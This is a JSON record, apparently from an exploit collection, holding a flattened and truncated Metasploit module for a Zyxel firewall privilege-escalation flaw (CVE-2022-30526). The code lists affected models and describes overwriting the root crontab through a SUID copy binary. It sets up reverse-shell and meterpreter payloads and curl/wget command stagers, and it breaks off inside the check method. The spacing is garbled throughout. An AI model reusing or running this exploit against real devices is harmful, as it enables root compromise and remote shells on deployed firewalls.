{
    "text": "vul_name : Zyxel Firewall SUID Binary Privilege Escalation ， vul_cve : CVE-2022-30526 , CVE-2022-30525 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = ExcellentRanking ， prepend Msf : Exploit : Remote : AutoCheck ， include Msf : Post : File ， include Msf : Exploit : CmdStager ， include Msf : Exploit : FileDropper ， super (  ， update_info (  ， info ,  ， 'Name' => 'Zyxel Firewall SUID Binary Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits CVE-2022-30526 , a local privilege escalation vulnerability that ， allows a low privileged user ( e.g. nobody ) escalate to root. The issue stems from ， a suid binary that allows all users to copy files as root. This module overwrites ， the firewall's crontab to execute an attacker provided script , resulting in code ， execution as root. ， In order to use this module , the attacker must first establish shell access. For ， example , by exploiting CVE-2022-30525. ， Known affected Zyxel models are : USG FLEX ( 50 , 50W , 100W , 200 , 500 , 700 )  ,  ， ATP ( 100 , 200 , 500 , 700 , 800 )  , VPN ( 50 , 100 , 300 , 1000 )  , USG20-VPN and USG20W-VPN. ， } ,  ， ' ，  [ 'CVE' , '2022-30526' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Author' => [  ， 'jbaines-r7' # discovery and metasploit module ，  ]  ,  ， 'DisclosureDate' => '2022-06-14' ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'linux' , 'unix' ]  ,  ， 'Arch' => [ ARCH_CMD , ARCH_MIPS64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_bash' ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_MIPS64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'CmdStagerFlavor' => [ 'curl' , 'wget' ]  ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/mips64/meterpreter_reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DefaultOptions' => { ， 'MeterpreterTryToFork' => true ,  ， 'WfsDelay' => 70 ， } ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK ]  ， } ， end ，  # The check first establishes the system is a Zyxel firewall by parsing the ，  # /zyinit/fwversion file. Then it attempts to prove that zysudo.suid can be ，  # used by the user to write to otherwise unwrittable location. ， def check ， fwversion_data = read_file ( '/zyinit/fwversion' ) ",
    "time": "2022.08.31"
}